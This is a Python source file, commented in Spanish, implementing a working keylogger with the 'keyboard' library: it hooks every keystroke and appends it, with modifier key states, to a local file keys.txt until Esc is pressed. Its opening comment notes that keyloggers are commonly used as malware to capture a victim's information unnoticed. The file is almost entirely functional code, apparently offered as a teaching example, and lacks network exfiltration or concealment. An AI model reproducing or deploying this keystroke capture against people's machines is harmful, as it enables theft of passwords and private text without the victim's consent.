'''
    KEYLOGGER
    Un keylogger es un software que regitsra las pulsaciones del teclado
    en donde el sofwate está siendo ejecutado, para posteriormente
    guardarlas en un archivo.
    Los keyloggers son bastante utilizados como malware para acceder
    a información sin que la "víctima" se de cuenta
'''
#%%
# Librerías a importar
'''
Se requiere instalar:
   pip install keyboard
'''
from functools import partial
import atexit
import os
import keyboard

# Mapear algunos caracteres especiales
MAP = {
    "space": " ",
    "\r": "\n"
}

# Aquí se guardará todo lo que vaya registrando el programa
FILE_NAME = "keys.txt"
# Esta variable determina si el archivo de salida se limpia cada vez
# que se inicia el programa
CLEAR_ON_STARTUP = False
# Con la siguiente tecla se termina el programa (por seguridad)
TERMINATE_KEY = "esc"

def callback(output, is_down, event):
    # Verificar si se presiona o levanta una tecla
    if event.event_type in ("up", "down"):
        # Obtener el nombre del evento tecla
        key = MAP.get(event.name, event.name)
        # Modificador cuando la longitud de key sea mayor a 1
        modifier = len(key) > 1
        # Capturar únicamente los modificadores cuando están siendo
        # presionados.
        if not modifier and event.event_type == "down":
            return
        # Evitar escribir múltiples veces la misma tecla si está
        # siendo presionada.
        if modifier:
            if event.event_type == "down":
                if is_down.get(key, False):
                    return
                else:
                    is_down[key] = True
            elif event.event_type == "up":
                is_down[key] = False
            # Indicar si está siendo presionado.
            key = " [{} ({})] ".format(key, event.event_type)
        elif key == "\r":
            # Salto de línea.
            key = "\n"
        # Escribir la tecla al archivo de salida.
        output.write(key)
        # Limpiar el buffer de salida
        output.flush()

# Cuando se cierre el archivo
def onexit(output):
    output.close()
    
def main():
    # Borrar el archivo previo.
    if CLEAR_ON_STARTUP:
        os.remove(FILE_NAME)
    
    # Indica si una tecla está siendo presionada.
    is_down = {}
    
    # Archivo de salida.
    output = open(FILE_NAME, "a")
    
    # Cerrar el archivo al terminar el programa.
    atexit.register(onexit, output)
    
    # Instalar el registrador de teclas.
    keyboard.hook(partial(callback, output, is_down))
    keyboard.wait(TERMINATE_KEY)

if __name__ == "__main__":
    main()